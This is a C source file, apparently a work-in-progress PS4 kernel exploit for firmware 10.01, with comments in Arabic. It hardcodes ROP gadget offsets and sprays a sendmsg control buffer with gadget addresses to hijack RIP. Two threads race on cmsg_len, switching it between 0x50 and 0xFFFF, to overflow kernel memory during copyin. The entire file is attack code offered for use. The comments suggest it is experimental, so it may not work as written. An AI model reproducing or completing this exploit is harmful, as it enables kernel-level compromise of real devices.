#include <ps4.h>


// الإزاحات لنسخة 10.01
#define OFF_POP_RAX_RET          0x29974f 
#define OFF_PUSH_RSP_POP_RSI_RET 0xbb3ee6 

struct msghdr {
    void *msg_name; uint32_t msg_namelen; void *msg_iov; int msg_iovlen;
    void *msg_control; uint32_t msg_controllen; int msg_flags;
};
struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };

#define CONTROL_LEN 256
uint8_t control_buf[CONTROL_LEN];
struct cmsghdr *cmsg;
int global_sock;

void build_payload(uint64_t kbase) {
    uint64_t pop_rax = kbase + OFF_POP_RAX_RET;
    uint64_t my_gadget = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    uint64_t val = 0x1111111111111111;

    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = 0; 
    cmsg->cmsg_type = 7; 
    cmsg->cmsg_len = 0x50; // القيمة التي يتوقعها الفحص الأول

    /* تعديل جوهري: نترك أول 64 بايت (0x40) أصفاراً تماماً 
       للحفاظ على استقرار هياكل النواة أثناء الـ copyin.
       ونبدأ الإغراق من الإزاحة 0x48 (حيث ظهر r12 سابقاً).
    */
    for (int i = 0x48; i < CONTROL_LEN - 16; i += 16) {
        *(uint64_t *)(control_buf + i) = pop_rax;
        *(uint64_t *)(control_buf + i + 8) = val;
    }
    
    // وضع الهدف النهائي في نهاية المنطقة المدهوسة لضمان إصابة RIP
    *(uint64_t *)(control_buf + 0x68) = my_gadget;
    *(uint64_t *)(control_buf + 0x70) = my_gadget;
}

void *sendmsg_thread(void *arg) {
    struct msghdr msg = {0};
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;
    while(1) { syscall(28, global_sock, &msg, 0); }
    return NULL;
}

void *race_thread(void *arg) {
    while(1) {
        cmsg->cmsg_len = 0x50;
        // تقليل حدة السباق قليلاً للسماح للنواة ببدء النسخ بأمان
        for(volatile int i=0; i<200; i++); 
        cmsg->cmsg_len = 0xFFFF; 
    }
    return NULL;
}

int _main(struct thread *td) {
    initKernel();
    initLibc();

    uint64_t kbase = get_kernel_base();
    build_payload(kbase);

    global_sock = syscall(97, 2, 2, 0);

    ScePthread t1, t2;
    scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&t2, NULL, race_thread, NULL, "thr_race");

    scePthreadJoin(t1, NULL);
    scePthreadJoin(t2, NULL);
    return 0;
}
